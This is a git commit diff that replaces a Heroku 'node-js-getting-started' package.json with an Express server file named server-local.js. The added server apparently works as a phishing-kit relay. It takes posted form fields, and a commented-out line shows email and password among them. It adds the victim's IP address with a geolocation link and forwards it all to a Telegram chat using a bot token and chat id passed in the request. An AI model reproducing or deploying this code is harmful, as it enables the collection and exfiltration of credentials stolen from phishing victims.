e6fd0c7a0c365fa1dc5530a67b26ed0e93c1b9d2
dkstools <120433478+dkstools@users.noreply.github.com>
2022-12-12 18:55:37 -0800

    Update server-local.js

--- server-local.js
+++ server-local.js
@@ -1,35 +1,51 @@
-{
-  "name": "node-js-getting-started",
-  "version": "0.3.0",
-  "description": "A sample Node.js app using Express 4",
-  "engines": {
-    "node": "16.x"
-  },
-  "main": "index.js",
-  "scripts": {
-    "start": "node index.js",
-    "test": "node test.js"
-  },
-  "dependencies": {
-    "body-parser": "^1.20.0",
-    "ejs": "^3.1.5",
-    "express": "^4.18.1",
-    "ip": "^1.1.8",
-    "multer": "^1.4.5-lts.1",
-    "node-telegram-bot-api": "^0.57.0"
-  },
-  "devDependencies": {
-    "got": "^11.3.0",
-    "tape": "^4.7.0"
-  },
-  "repository": {
-    "type": "git",
-    "url": "https://github.com/heroku/node-js-getting-started"
-  },
-  "keywords": [
-    "node",
-    "heroku",
-    "express"
-  ],
-  "license": "MIT"
+var express = require('express');
+var bodyParser = require('body-parser');
+const PORT = process.env.PORT || 5000;
+const TelegramBot = require('node-telegram-bot-api');
+var multer = require('multer');
+var upload = multer();
+var app = express();
+
+app.get('/', function(req, res){
+   res.render('form');
+});
+
+app.set('view engine', 'pug');
+app.set('views', './views');
+
+// for parsing application/json
+app.use(bodyParser.json()); 
+
+// for parsing application/xwww-
+app.use(bodyParser.urlencoded({ extended: true })); 
+//form-urlencoded
+
+// // for parsing multipart/form-data
+// app.use(upload.array()); 
+// app.use(express.static('public'));
+
+app.post('/', function(req, res){
+   res.header("Access-Control-Allow-Origin", "*");
+   res.header('Access-Control-Allow-Methods', 'DELETE, PUT');
+   res.header("Access-Control-Allow-Headers", "Origin, X-Requested-With, Content-Type, Accept");
+   var ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
+  
+   // var message= "------------------------\nEmail : "+req.body.email+"\npassword : "+req.body.password+"\nmode: "+req.body.mode+"\nhttp://www.geoiptool.com/?IP="+ip+"\n";
+       let msg='';
+  for (let [key, value] of Object.entries(req.body.val)) {
+  msg +=key+' : '+ value+'\n';
+ 
 }
+msg += "\nhttp://www.geoiptool.com/?IP="+ip+"\n";
+     
+   console.log(msg);
+
+
+// Create a bot that uses 'polling' to fetch new updates
+const bot = new TelegramBot(req.body.tok, {polling: true});
+
+bot.sendMessage(req.body.telid, msg);
+   res.send("recieved your request!");
+});
+
+app.listen(PORT);
